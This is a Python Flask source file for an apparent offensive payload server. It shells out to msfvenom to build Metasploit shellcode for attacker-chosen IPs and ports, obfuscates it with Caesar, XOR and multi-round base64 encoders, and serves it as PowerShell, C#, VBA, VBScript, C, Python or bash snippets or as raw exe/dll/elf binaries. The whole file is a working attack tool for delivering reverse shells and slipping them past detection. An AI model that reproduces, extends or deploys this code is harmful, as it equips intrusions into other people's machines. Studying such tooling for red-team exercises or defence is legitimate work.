import json
import inspect
import pathlib
import hashlib
import argparse
import subprocess
import base64
from flask import Flask, request, abort

app = Flask(__name__)
folder = pathlib.Path('shellcodes')

class Cipher:
    def __init__(self, key):
        self.key = key
        self.init()
    def init(self):
        pass
    def run(self, buf):
        return buf

class Caesar(Cipher):
    def init(self):
        self.key = int(self.key)
    def run(self, buf):
        buf = [ ((_+self.key) & 0xFF) for _ in buf]
        return buf

class XorCipher(Cipher):
    def run(self, buf):
        #       t  r  e  e
        #      74 72 65 65
        #XOR   48 31 FF 6A
        #------------------
        #      3c 43 9A 0F
        buf = [ ((buf[i]^ord(self.key[i % len(self.key)])) & 0xFF) for i in range(len(buf)) ]
        return buf

class Base64Encoder(Cipher):
    def init(self):
        self.key = int(self.key)
    def run(self, buf):
        for i in range(self.key):
            buf = base64.b64encode(bytearray(buf))
        return buf

class ComboCipher(Cipher):
    def init(self):
        assert isinstance(self.key, list)
    def add(self, _cipher):
        self.key.append(_cipher)
    def clear(self):
        self.key = []
    def run(self, buf):
        for _cipher in self.key:
            buf = _cipher.run(buf)
        return buf

class Chain:
    def __init__(self, expression=None):
        self.chain = self.parse(expression)
        print(self.chain)

    def parse(self, expr):
        if expr is None:
            return []
        for seg in expr.split('-')[::2]:
            if seg not in ciphers:
                raise Exception("cipher '%s' not exist" % seg)
        segments = expr.split('-')
        assert len(segments) % 2 == 0
        return [(segments[2*i], segments[2*i+1]) for i in range(len(segments)//2)][::-1] # since encoder = rev decoder

    def getCipher(self):
        _c = Cipher(None)
        if len(self.chain) == 0:
            return _c
        _c = ComboCipher([])
        for (fn, key) in self.chain:
            _c.add(ciphers[fn](key))
        return _c

ciphers = {
    'cae': Caesar,
    'xor': XorCipher,
    'b64': Base64Encoder,
}

class FormatFactory:
    @staticmethod
    def ps1(buf, w=None):
        width = 0 if w is None else int(w)
        return '[Byte[]] $buf = %s\n' % ','.join(map(lambda x: hex(x), buf))
    @staticmethod
    def csharp(buf, w=None):
        width = 15 if w is None else int(w)
        lines = []
        for i in range(0, len(buf), width):
            lines.append( ','.join(map(lambda x: '0x%02x' % x, buf[i:i+width])) + ',' )
        lines[-1] = lines[-1].rstrip(',')
        return 'byte[] buf = new byte[%d] {\n%s };\n' % (len(buf), '\n'.join(lines))
    @staticmethod
    def vba(buf, w=None):
        width = 50 if w is None else int(w)
        lines = []
        _ = ''
        for i in range(0, len(buf), width):
            lines.append( _ + ', '.join(map(lambda x: '%d' % x, buf[i:i+width])))
            _ = ''
        return 'buf = Array(%s)' % ', _\n'.join(lines) + '\n'
    @staticmethod
    def vbscript(buf, w=None):
        width = 100 if w is None else int(w)
        lines = []
        _ = ''
        for i in range(0, len(buf), width):
            lines.append( 'buf=' + _ + '&'.join(map(lambda x: 'Chr(%d)' % x, buf[i:i+width])))
            _ = 'buf&'
        return '\n'.join(lines) + '\n'
    @staticmethod
    def python(buf, w=None):
        width = 13 if w is None else int(w)
        lines = []
        for i in range(0, len(buf), width):
            lines.append( 'buf += b"%s"' % ''.join(map(lambda x: '\\x%02x' % (x), buf[i:i+width])) )
        return 'buf =  b""\n%s\n' % '\n'.join(lines)
    @staticmethod
    def c(buf, w=None):
        width = 15 if w is None else int(w)
        lines = []
        for i in range(0, len(buf), width):
            lines.append( '"%s"' % ''.join(map(lambda x: '\\x%02x' % (x), buf[i:i+width])) )
        return 'unsigned char buf[] =\n%s;\n' % '\n'.join(lines)
    @staticmethod
    def bash(buf, w=None):
        width = 14 if w is None else int(w)
        lines = []
        for i in range(0, len(buf), width):
            lines.append( "$'%s'" % ''.join(map(lambda x: '\\x%02x' % (x), buf[i:i+width])) )
        return 'export buf=\\\n%s\n' % '\\\n'.join(lines)
    @staticmethod
    def raw(buf, w=None):
        return bytearray(buf)

def compute_hash(parameters):
    return hashlib.md5(json.dumps(sorted(parameters.items())).encode()).hexdigest()

def serve_binary(_payload, path, ext, **args):
    if 'ip' in args and 'port' in args:
        path = path.with_name(path.name + '-%s.%s' % (compute_hash(args), ext))
    else:
        path = path.with_suffix('.'+ext)

    if path.exists():
        print('[+] fetch from file')
        with path.open(mode='rb') as f:
            return f.read()
    print('[-] fetch from msfvenom')
    command = ['msfvenom', '-p', _payload,
        '-f', ext]
    if 'ip' in args and 'port' in args:
        command.append('LHOST=%s' % args['ip'])
        command.append('LPORT=%s' % args['port'])
    print(command)
    val = subprocess.check_output(command)
    if not path.parent.exists():
        path.parent.mkdir(parents=True)
    with path.open(mode='wb') as f:
        f.write(val)
    return val

# msfvenom -f ps1 ...
@app.route("/<any('linux','windows'):platform>/<any('x86','x64'):arch>/<payload>", methods=["GET"])
@app.route("/<any('linux','windows'):platform>/<any('x86','x64'):arch>/<payload>/<payload2>", methods=["GET"])
def serve(platform, arch, payload, payload2=None):
    args = dict((k, v) for k, v in request.args.items())
    path = folder / platform / arch / payload
    _payload = '/'.join(filter(None, (platform, 'x64' if arch == 'x64' else None, payload, payload2)))
    if payload2 is not None:
        path /= payload2

    # avoid compute hash with transformable value EX. enc, key, o, chain

    cipher = Cipher(None)
    if 'chain' in args: # advanced encoder technique
        cipher = Chain(args.pop('chain')).getCipher()
    elif 'enc' in args and 'key' in args:
        enc, key = args.pop('enc'), args.pop('key')
        assert enc in ciphers
        cipher = ciphers.get(enc)(key)

    output_format = args.pop('o', 'ps1')
    if output_format in ['exe', 'dll', 'elf']:
        return bytearray(cipher.run(serve_binary(_payload, path, output_format, **args)))

    if 'ip' in args and 'port' in args:
        path = path.with_name(path.name + '-%s.txt' % compute_hash(args))
    else:
        path = path.with_suffix('.txt')

    if path.exists():
        print('[+] fetch from file(%s)' % path)
        with path.open(mode='rb') as f:
            shellcode = f.read()
        #with path.open() as f:
        #    shellcode = list(map(lambda x: int(x, 16), f.read().split(',')))
    else:
        print('[-] fetch from msfvenom')
        command = ['msfvenom', '-p', _payload, '-f', 'raw']#, '-b', '\\x00']
        if 'ip' in args and 'port' in args:
            command.append('LHOST=%s' % args['ip'])
            command.append('LPORT=%s' % args['port'])
        print(command)
        if not path.parent.exists():
            path.parent.mkdir(parents=True)
        shellcode = subprocess.check_output(command)
        with path.open(mode='wb') as f:
            f.write(shellcode)
        #val = subprocess.check_output(command).decode()[len('[Byte[]] $buf = '):]
        #with path.open(mode='w') as f:
        #    f.write(val)
        #shellcode = list(map(lambda x: int(x, 16), val.split(',')))

    if 'ip' in args and 'port' in args:
        args.pop('ip'), args.pop('port')

    if not hasattr(FormatFactory, output_format):
        abort(400)
    output = getattr(FormatFactory, output_format)(cipher.run(shellcode), **args)
    return output

@app.route("/encoders", methods=["GET"])
def _encoders():
    encode_funcs = inspect.getmembers(FormatFactory, predicate=inspect.isfunction)
    encode_funcnames = [_[0] for _ in encode_funcs]
    return json.dumps(encode_funcnames, indent=2)

@app.route("/formatters", methods=["GET"])
def _formatters():
    format_funcs = inspect.getmembers(FormatFactory, predicate=inspect.isfunction)
    format_funcnames = [_[0] for _ in format_funcs]
    return json.dumps(format_funcnames, indent=2)

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-H', '--host', default='0.0.0.0')
    parser.add_argument('-p', '--port', default='8787')
    parser.add_argument('--debug', action='store_true')
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    app.run(host=args.host, port=args.port, debug=args.debug)
